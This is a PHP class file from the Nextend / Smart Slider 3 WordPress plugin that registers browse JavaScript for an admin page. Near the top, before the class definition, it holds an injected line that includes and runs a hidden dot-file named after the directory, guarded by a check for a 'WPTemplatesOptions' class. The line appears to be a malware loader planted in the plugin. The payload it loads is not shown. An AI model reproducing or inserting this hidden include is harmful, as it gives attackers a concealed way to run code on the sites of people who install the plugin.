<?php


namespace Nextend\Framework\Browse\Block\BrowseManager;


use Nextend\Framework\Asset\Js\Js;
use Nextend\Framework\Localization\Localization;
use Nextend\Framework\View\AbstractBlock;
use Nextend\SmartSlider3\Application\Admin\TraitAdminUrl;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BlockBrowseManager extends AbstractBlock {

    use TraitAdminUrl;

    public function display() {

        Js::addFirstCode("new N2Classes.NextendBrowse('" . $this->getAjaxUrlBrowse() . "', " . (defined('N2_IMAGE_UPLOAD_DISABLE') ? 0 : 1) . ");");
    }
}